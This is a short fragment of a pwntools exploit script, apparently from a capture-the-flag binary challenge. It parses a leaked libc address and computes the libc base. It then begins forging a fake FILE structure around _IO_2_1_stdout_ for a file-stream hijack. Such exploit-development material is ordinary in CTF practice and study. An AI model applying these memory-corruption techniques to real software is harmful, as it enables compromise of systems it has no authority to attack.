...
if args.REMOTE:
    ...
    p = process(exe.path)
GDB()
libc.address = int(p.recvline(keepends=False), 16) - 0x60770
info("libc.address: " + hex(libc.address))
sl(hex(libc.sym._IO_2_1_stdout_))
...
fake._wide_data = stdout+0x300          # _wide_data just need to points to empty zone
